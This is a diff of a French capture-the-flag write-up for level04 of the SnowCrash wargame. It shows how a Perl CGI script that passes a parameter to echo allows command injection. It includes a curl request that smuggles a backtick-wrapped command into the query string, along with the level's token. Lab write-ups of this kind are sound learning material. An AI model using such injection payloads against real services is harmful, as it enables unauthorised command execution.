@@ -25,13 +25,14 @@ Ce script est un script CGI (Common Gateway Interface) écrit en Perl. Il s'exé
 
 La fonction x() stocke la valeur passée en paramètre dans la variable $y et imprime la variable $y via la commande echo. Où 2>&1 redirige la sortie d'erreur standard vers la sortie standard.
 
-Ainsi, le script level04.pl génère les paramètres transmis par l'utilisateur et vous pouvez transmettre des commandes shell arbitraires aux paramètres. Cela peut conduire à des vulnérabilités d'injection de commandes.
+Ainsi, le script level04.pl génère les paramètres transmis par l'utilisateur et on peut transmettre des commandes shell arbitraires aux paramètres. Cela peut conduire à des vulnérabilités d'injection de commandes.
 
-## 
+##
+
 Paramètres d'envoi
 
 ```zsh
-curl localhost:4747/?x=<parameter>
+curl localhost:4747/?x=\`CMD\`
 ```
 
 ```zsh
@@ -40,6 +41,6 @@ flag04
 level04@SnowCrash:~$ curl "http://localhost:4747?x=\`getflag\`"
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
 level04@SnowCrash:~$ su level05
-Password: 
-level05@SnowCrash:~$ 
+Password:
+level05@SnowCrash:~$
 ```
